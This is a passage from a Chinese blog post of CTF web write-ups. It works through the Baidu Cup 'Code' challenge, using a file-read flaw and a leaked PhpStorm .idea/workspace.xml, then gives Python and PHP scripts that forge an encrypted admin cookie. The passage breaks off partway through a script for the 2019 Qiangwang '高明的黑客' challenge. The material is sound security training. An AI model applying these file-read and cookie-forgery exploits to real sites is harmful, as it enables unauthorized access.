<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="其它"><meta name="keywords" content="CTF题"><meta name="author" content="Extrader"><meta name="copyright" content="Extrader"><title>其它 | Extrader</title><link rel="shortcut icon" href="/favico.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#其它"><span class="toc-number">1.</span> <span class="toc-text">其它</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#百度杯九月场Code"><span class="toc-number">1.1.</span> <span class="toc-text">百度杯九月场Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2019强网杯—高明的黑客"><span class="toc-number">1.2.</span> <span class="toc-text">2019强网杯—高明的黑客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2018HCTF—admin"><span class="toc-number">1.3.</span> <span class="toc-text">2018HCTF—admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-session-伪造"><span class="toc-number">1.3.1.</span> <span class="toc-text">Flask session 伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unicode欺骗"><span class="toc-number">1.3.2.</span> <span class="toc-text">Unicode欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安恒杯-新春祈福赛—枯燥的抽奖"><span class="toc-number">1.4.</span> <span class="toc-text">安恒杯-新春祈福赛—枯燥的抽奖</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP弱类型"><span class="toc-number">2.</span> <span class="toc-text">PHP弱类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#安恒月赛—web2-hash"><span class="toc-number">2.1.</span> <span class="toc-text">安恒月赛—web2_hash</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP走私"><span class="toc-number">3.</span> <span class="toc-text">HTTP走私</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2019RoarCTF—Easy-Calc"><span class="toc-number">3.1.</span> <span class="toc-text">2019RoarCTF—Easy Calc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#界面"><span class="toc-number">3.1.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题方法"><span class="toc-number">3.1.2.</span> <span class="toc-text">解题方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#服务器http走私漏洞绕WAF"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">服务器http走私漏洞绕WAF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP字符串解析特性绕过WAF"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">PHP字符串解析特性绕过WAF</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Extrader</div><div class="author-info__description text-center">error天上来</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">26</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">19</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">4</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="http://wlaport.top/" target="_blank" rel="noopener">Zhu</a><a class="author-info-links__name text-center" href="https://www.suk1.top/" target="_blank" rel="noopener">Manayakko</a><a class="author-info-links__name text-center" href="https://www.zhaoj.in/" target="_blank" rel="noopener">Glzjin</a><a class="author-info-links__name text-center" href="https://www.leavesongs.com/" target="_blank" rel="noopener">Phithon</a><a class="author-info-links__name text-center" href="https://www.smi1e.top/" target="_blank" rel="noopener">Smi1e</a><a class="author-info-links__name text-center" href="http://yulige.top/" target="_blank" rel="noopener">郁离歌</a><a class="author-info-links__name text-center" href="https://www.gem-love.com/" target="_blank" rel="noopener">y1ng</a><a class="author-info-links__name text-center" href="http://www.pdsdt.lovepdsdt.com/" target="_blank" rel="noopener">Pdsdt</a><a class="author-info-links__name text-center" href="https://www.sqlsec.com/" target="_blank" rel="noopener">国光</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2020/03/28/nt9OgCF3k8DPRB7.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Extrader</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">首页</a><a class="site-page" href="/archives">时间轴</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">其它</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-01</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">5.4k</span><span class="post-meta__separator">|</span><span>阅读时长: 24 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><h2 id="百度杯九月场Code"><a href="#百度杯九月场Code" class="headerlink" title="百度杯九月场Code"></a>百度杯九月场Code</h2><p>界面：</p>
<p><img src="https://i.loli.net/2020/03/26/L6dOWMnJXirt9bk.png" alt=""></p>
<p>url：<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=hei.jpg</code>，查看源码：</p>
<p><img src="https://i.loli.net/2020/03/26/9N3A46Xmk2jKRBp.png" alt=""></p>
<p>猜测存在文件包含读取文件操作，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=index.php</code>查看源码：</p>
<p><img src="https://i.loli.net/2020/03/26/5Holtq4dVfOJSn9.png" alt=""></p>
<p>base64解密后得到index.php的源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span>);</span><br><span class="line">$file = $_GET[<span class="string">'jpg'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;file:'</span>.$file.<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"_"</span>, $file);</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意注释里的这话句<code>Created by PhpStorm</code>，是用<code>PhpStorm</code>编辑器写的，用这个编辑器写的工程文件下会有一个<code>.idea</code>文件夹，<a href="https://segmentfault.com/q/1010000008644646" target="_blank" rel="noopener">详</a>，类似于这个项目的根目录文件，里面包含了一些xml文件（配置）。</p>
<p>于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/.idea/workspace.xml</code>得到一个xml页面，提取其中有用信息</p>
<p><img src="https://i.loli.net/2020/03/26/73OdTw1zpvl6jqb.png" alt=""></p>
<p>结合<code>index.php</code>的源码利用<code>config</code>代替<code>_</code>，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php</code>得到<code>fl3g_ichuqiu.php</code>的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span>)</span> </span>&#123;</span><br><span class="line">    $hash = <span class="string">''</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)	&#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($txt,$key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt = $tmp;</span><br><span class="line">    $rnd=random(<span class="number">4</span>);</span><br><span class="line">    $key=md5($rnd.$key);</span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $ttmp .= $txt[$i] ^ $key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($rnd.$ttmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($txt,$key)</span></span>&#123;</span><br><span class="line">    $txt=base64_decode($txt);</span><br><span class="line">    $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);</span><br><span class="line">    $txt = substr($txt,<span class="number">4</span>);</span><br><span class="line">    $key=md5($rnd.$key);</span><br><span class="line"></span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $tmp .= $txt[$i]^$key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</span><br><span class="line">        $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp1;</span><br><span class="line">&#125;</span><br><span class="line">$username = decrypt($_COOKIE[<span class="string">'user'</span>],$key);</span><br><span class="line"><span class="keyword">if</span> ($username == <span class="string">'system'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">'user'</span>,encrypt(<span class="string">'guest'</span>,$key));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"╮(╯▽╰)╭"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现分别有一个加密函数，一个解密函数，分析php代码；</p>
<p>当传入<code>cookie</code>中的<code>user</code>的值经过<code>decrypt</code>函数后返回的值为<code>system</code>，就可以得到flag，所以我们需要得到一串base64码，这一串base64经过<code>decrypt</code>函数能解出<code>system</code>，于是</p>
<p>由<code>guest</code>可以逆推出<code>rnd</code>的值和md5加密后<code>key</code>值的前5位；</p>
<p>再由<code>key</code>的前5位得出所有前6位可能的值，再通过<code>decrypt</code>函数逆推出函数中<code>$txt</code>值的后6位，再在前面加上<code>$rnd</code>的值经过base64加密后得到的16个可能的<code>user</code>值，再拿16个值去bp进行爆破，即可得到flag</p>
<p>写出解密脚本，得到<code>rnd</code>和md5加密后的<code>key</code>值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">session = <span class="string">'OFZhSEdLVxga'</span><span class="comment">#本地user值</span></span><br><span class="line">txt = base64.b64decode(session.encode()).decode()</span><br><span class="line">rnd = txt[<span class="number">0</span>:<span class="number">4</span>]   <span class="comment">#拿到rnd的值</span></span><br><span class="line">ttemp = txt[<span class="number">4</span>:]</span><br><span class="line">guest = <span class="string">'guest'</span></span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(guest)):</span><br><span class="line">    tmp += chr(ord(guest[i]) + <span class="number">10</span>)</span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ttemp)):</span><br><span class="line">    key += chr(ord(tmp[i]) ^ ord(ttemp[i]))<span class="comment">#拿到key</span></span><br><span class="line">system = <span class="string">'system'</span></span><br><span class="line">system1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(system)):</span><br><span class="line">    system1 += chr(ord(system[i]) + <span class="number">10</span>)</span><br><span class="line">md5 = <span class="string">'0123456789abcdef'</span><span class="comment">#经过md5加密后的每一位数都是0-f之间的数</span></span><br><span class="line">key_new = <span class="string">''</span></span><br><span class="line">cookie_new = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(md5)): <span class="comment">#循环出所有可能的结果</span></span><br><span class="line">    key_new  = key + md5[i]</span><br><span class="line">    session_new = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(system1)):</span><br><span class="line">        session_new += chr(ord(key_new[j]) ^ ord(system1[j]))</span><br><span class="line">    session_new = rnd + session_new</span><br><span class="line">    cookie_new = base64.b64encode(session_new.encode()).decode()</span><br><span class="line">    print(cookie_new)</span><br></pre></td></tr></table></figure>

<p>运行脚本得到16个base64加密后的值</p>
<p>按理说原题利用bp是可以爆破的出来的，但是这个题目不知道是环境的问题还是什么原因，后端的user值一直在变，意思是说<code>rnd</code>值一直在变，那md5加密后的<code>key</code>值也会变，脚本就毫无意义，所以无果，还是我哪里理解错了。。。。。先放这里，等我啥时候想明白了，或者哪位大佬告诉我原因了再补上。</p>
<p>我来填坑了，上面一步我还是理解错了，刷新界面就算会再次执行php脚本，但也会在比较完<code>$username</code>的值后再进入else函数再执行一遍<code>encrypt</code>函数回显一个新的<code>cookie</code>，所以不用考虑<code>user</code>的值会变的问题，因为在他变之前如果我们已经判断出<code>$username</code>==<code>system</code>了，就会成功拿到flag，而后台不会再调用<code>encrypt</code>函数生成新的<code>user</code>，所以这里是没有问题的，但是爆破的时候还是爆破不出来，为什么呢？我可是怀疑我的python脚本</p>
<p>在网上找个php脚本来执行一下看看二者得出来的base64有什么区别</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $txt1 = <span class="string">'guest'</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($txt1); $i++) &#123;</span><br><span class="line">        $txt1[$i] = chr(ord($txt1[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $cookie_guest = <span class="string">'emVTQkZHCh8d'</span>; </span><br><span class="line">    $cookie_guest = base64_decode($cookie_guest);</span><br><span class="line">    $rnd = substr($cookie_guest,<span class="number">0</span>,<span class="number">4</span>); </span><br><span class="line">    $ttmp = substr($cookie_guest,<span class="number">4</span>);</span><br><span class="line">    $key=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($txt1); $i++) &#123;</span><br><span class="line">        $key .= ($txt1[$i] ^ $ttmp[$i]);<span class="comment">//$key=md5($rnd.$key);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $txt2 = <span class="string">'system'</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($txt2); $i++) &#123;</span><br><span class="line">        $txt2[$i] = chr(ord($txt2[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $md5 = <span class="string">'0123456789abcdef'</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($md5); $i++) &#123;</span><br><span class="line">        $key_new = $key.$md5[$i];</span><br><span class="line">        $cookie_system=<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($txt2); $j++) &#123;</span><br><span class="line">            $cookie_system .= ($key_new[$j] ^ $txt2[$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        $cookie_system = base64_encode($rnd.$cookie_system);</span><br><span class="line">        <span class="keyword">echo</span> $cookie_system.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/26/tBZ9ouP8iFJQCTs.png" alt=""></p>
<p>发现预期结果和我想的并不一样，但是结果却有几分相似，逐步排查后发现到最后一步我得到的key的6位值和php上的是一样的，但结果经过base64编码后就不一样了，应该是编码的问题，在网上查了一番后发现python3默认把脚本文件用<code>utf-8</code>进行编码，python2用的是<code>ascii</code>（我用的是python3，python2不会出现这种情况），而php对base64编码的函数是好像用的ascii进行编码（应该~，后文验证），于是改用脚本base64编码方式，这里使用<code>Latin1</code>进行编码，<strong>Latin1编码是单字节编码，向下兼容ASCII，</strong>其编码范围是0x00-0xFF，0x00-0x7F之间完全和ASCII一致，0x80-0x9F之间是控制字符，0xA0-0xFF之间是文字符号，<a href="https://blog.csdn.net/BLGT_57/article/details/80848492" target="_blank" rel="noopener">详</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">session = <span class="string">'QlRxaRVPCx5K'</span></span><br><span class="line">txt = str(base64.b64decode(session),<span class="string">"Latin1"</span>)</span><br><span class="line">rnd = txt[<span class="number">0</span>:<span class="number">4</span>]   <span class="comment">#拿到rnd的值</span></span><br><span class="line">ttemp = txt[<span class="number">4</span>:]</span><br><span class="line">guest = <span class="string">'guest'</span></span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(guest)):</span><br><span class="line">    tmp += chr(ord(guest[i]) + <span class="number">10</span>)</span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ttemp)):</span><br><span class="line">    key += chr(ord(tmp[i]) ^ ord(ttemp[i]))<span class="comment">#拿到key</span></span><br><span class="line">system = <span class="string">'system'</span></span><br><span class="line">system1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(system)):</span><br><span class="line">    system1 += chr(ord(system[i]) + <span class="number">10</span>)</span><br><span class="line">md5 = <span class="string">'0123456789abcdef'</span></span><br><span class="line">key_new = <span class="string">''</span></span><br><span class="line">cookie_new = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(md5)):</span><br><span class="line">    key_new  = key + md5[i]</span><br><span class="line">    session_new = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(system1)):</span><br><span class="line">        session_new += chr(ord(key_new[j]) ^ ord(system1[j]))</span><br><span class="line">    session_new = rnd + session_new</span><br><span class="line">    cookie_new = str(base64.b64encode(session_new.encode(<span class="string">'Latin1'</span>)),<span class="string">'Latin1'</span>)</span><br><span class="line">    print(cookie_new)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/26/EwgbXFlpsVe4cYr.png" alt=""></p>
<p>于是得到的值和php编码出来的完全一致，然后拿到bp中进行爆破拿到flag</p>
<p><img src="https://i.loli.net/2020/03/26/X2dqYUFaf4uNP9r.png" alt=""></p>
<p>写脚本的水平实在是太菜了，还得多练才行</p>
<h2 id="2019强网杯—高明的黑客"><a href="#2019强网杯—高明的黑客" class="headerlink" title="2019强网杯—高明的黑客"></a>2019强网杯—高明的黑客</h2><p>核心————————–python脚本</p>
<p>界面：</p>
<p><img src="https://i.loli.net/2020/03/26/vKcNfgFOUbpPswa.png" alt=""></p>
<p>将源码下载下来解压后发现有3000多个php文件，于是上大佬脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：  '</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r"C:/Users/71071/Desktop/src/"</span></span><br><span class="line">os.chdir(filePath)					    <span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>	<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>				<span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">'trying   '</span>+file+ <span class="string">'     '</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">  